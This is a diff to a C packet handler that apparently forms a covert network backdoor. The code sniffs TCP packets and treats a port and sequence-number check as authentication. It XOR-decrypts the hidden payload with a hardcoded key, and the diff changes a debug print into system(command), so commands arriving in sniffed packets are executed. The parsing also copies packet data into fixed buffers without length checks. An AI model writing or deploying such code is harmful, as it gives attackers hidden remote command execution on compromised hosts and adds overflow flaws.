@@ -1,6 +1,8 @@
-#include "packet_handler.h"
+#include <unistd.h>
+
 #include "crypto.h"
 #include "packet_auth.h"
+#include "packet_handler.h"
 
 int get_source_port(const u_char* packet)
 {
@@ -43,9 +45,9 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     const char* KEY = "key";
 
     const int MAX_COMMAND_LEN = 1024;
-    const int ETHER_IP_UDP_LEN = 44;
 
     char command[MAX_COMMAND_LEN];
+    char payload_buffer[MAX_COMMAND_LEN];
     char decrypted[MAX_COMMAND_LEN];
 
     int len;
@@ -62,6 +64,12 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     int size_ip = 0;
     int size_tcp = 0;
 
+    // clear buffers
+    memset(command, 0, MAX_COMMAND_LEN);
+    memset(payload_buffer, 0, MAX_COMMAND_LEN);
+    memset(decrypted, 0, MAX_COMMAND_LEN);
+
+    // calculate lengths
     ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
     size_ip = IP_HL(ip) * 4;
 
@@ -72,39 +80,34 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
     tcp_seqnum = ntohl(tcp->th_seq);
 
     // Step 1: Locate the payload of the packet
-    payload = (char*)(packet + ETHER_IP_UDP_LEN);
-    if ((header->caplen - ETHER_IP_UDP_LEN - 14) <= 0) // Why 14?
-    {
-        printf("error 1");
-        return;
-    }
+    payload = (char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
 
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum))
     {
-        printf("packet not authenticated\n");
-        printf("source port: %d\n", tcp_sport);
-        printf("sequence_number: %d\n", tcp_seqnum);
+        // printf("packet not authenticated\n");
+        // printf("source port: %d\n", tcp_sport);
+        // printf("sequence_number: %d\n", tcp_seqnum);
         return;
     }
+    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
 
-    printf("Got an authenticated packet\n Source port: %d\n Seqnum: %d\n", tcp_sport, tcp_seqnum);
     // Step 3: Decrypt the payload
-    xor_decrypt(KEY, strlen(KEY), payload, MAX_COMMAND_LEN, decrypted);
-    //printf("%s\n", decrypted);
+    hex_str_to_bytes(payload, payload_buffer, strlen(payload));
+    xor_decrypt(KEY, strlen(KEY), payload_buffer, strlen(payload) / 2, decrypted);
+    printf("Decrypted payload: %s\n", decrypted);
+
     // Step 4: Verify decrypted payload has a command in it
-    if (!(payload = strstr(decrypted, COMMAND_START)))
-        return;
+    if (!(payload = strstr(decrypted, COMMAND_START))) return;
     payload += strlen(COMMAND_START);
-    if (!(end_ptr = strstr(decrypted, COMMAND_END)))
-        return;
+    if (!(end_ptr = strstr(decrypted, COMMAND_END))) return;
 
     // Step 5: Extract the command
     memset(command, 0, sizeof(command));
     strncpy(command, payload, end_ptr - payload);
 
     // Step 6: Execute the command
-    printf("executing command: %s/n", command);
+    system(command);
 
     // Step 7: Send the command's output to the sender of the command
 
